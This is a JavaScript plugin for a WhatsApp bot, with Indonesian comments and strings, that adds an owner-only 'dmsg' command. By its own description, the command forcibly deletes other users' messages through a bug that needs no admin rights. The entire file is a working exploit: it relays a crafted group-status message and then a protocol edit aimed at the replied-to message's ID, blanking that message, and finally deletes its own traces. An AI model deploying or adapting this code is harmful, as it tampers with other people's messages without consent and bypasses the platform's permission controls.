/**
 * @import {PluginCtx, PluginType} from "../../types/types.js"
 */

const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

/**
 * @param {PluginCtx} ctx
 */
async function run(ctx) {
if (!ctx.isOwner) return 
    const { sock, m, q, jid } = ctx;

    
    if (!q) {
        return m.arashirep("reply pesan nya sayang");
    }

    const stanzaId = q.id || q.key?.id || q.raw?.key?.id;

    if (!stanzaId) {
        return m.arashirep("Gagal mengambil ID pesan yang direply.");
    }

    try {
       
        const tempId = await sock.relayMessage(
            jid,
            {
                groupStatusMessageV2: {
                    message: {
                        extendedTextMessage: {
                            text: '',
                            contextInfo: {
                                isGroupStatus: true,
                            },
                        },
                    },
                },
            },
            {}
        );

       
        const tempId2 = await sock.relayMessage(
            jid,
            {
                protocolMessage: {
                    key: {
                        jid: jid,
                        fromMe: true,
                        id: tempId,
                    },
                    type: 14,
                    editedMessage: {
                        extendedTextMessage: {
                            text: '\0',
                            contextInfo: {
                                isGroupStatus: false,
                            },
                        },
                    },
                },
            },
            {
                messageId: stanzaId,
            }
        );

        await Promise.allSettled([
            sock.sendMessage(jid, {
                delete: {
                    remoteJid: jid,
                    id: tempId,
                    fromMe: true,
                },
            }),
            sock.sendMessage(jid, {
                delete: {
                    remoteJid: jid,
                    id: tempId2,
                    fromMe: true,
                },
            }),
        ]);

  
    } catch (e) {
        console.error('[dmsg error]', e);
        await m.react("❌");
        await m.arashirep('❌ Error: ' + (e?.message || e));
    }
}

/** @type {PluginType} */
const plugin = {
    run,
    name: "delete message any",
    commands: ["dmsg", "d", "del"],
    categories: ["owner"],
    description: "Menghapus pesan orang lain secara paksa (bug)"
};

plugin.meta = {
    filename: "dmsg.js",
    version: "1.0",
    author: "Nixel | Ported by Mina",
    note: "Bug dmsg without admin",
    path: "owner"
};

export default plugin;